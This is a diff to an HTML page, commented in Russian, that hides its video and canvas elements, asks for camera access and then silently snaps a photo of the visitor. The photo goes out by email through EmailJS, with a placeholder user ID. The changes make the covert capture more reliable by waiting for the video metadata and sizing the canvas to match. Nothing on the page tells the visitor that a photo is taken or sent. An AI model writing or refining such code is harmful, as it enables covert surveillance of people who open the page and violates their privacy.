@@ -15,19 +15,17 @@
       align-items: center;
       overflow: hidden;
     }
-    video, canvas, img {
+    video, canvas {
       display: none;
     }
   </style>
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
+  <canvas id="canvas"></canvas>
 
-  <!-- EmailJS SDK -->
   <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
   <script>
-    // Инициализация EmailJS
     emailjs.init("ТВОЙ_USER_ID");
 
     function sendPhoto(photoUrl) {
@@ -41,23 +39,29 @@
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
 
-    // Запрос доступа к камере
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // Ждём 1 секунду и делаем фото
-        setTimeout(() => {
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const photoData = canvas.toDataURL('image/png');
+        // Ждём, пока видео реально готово
+        video.onloadedmetadata = () => {
+          video.play();
 
-          console.log('Фото сделано:', photoData);
+          // Устанавливаем canvas размером с видео
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
 
-          // Отправка на почту через EmailJS
-          sendPhoto(photoData);
-        }, 1000); // задержка 1 секунда
+          // Делаем фото через небольшую задержку
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL('image/png');
+            console.log('Фото сделано:', photoData);
+
+            sendPhoto(photoData); // отправка на EmailJS
+          }, 500); // 0.5 секунды
+        };
       })
       .catch(err => {
         alert("Ошибка доступа к камере: " + err.message);
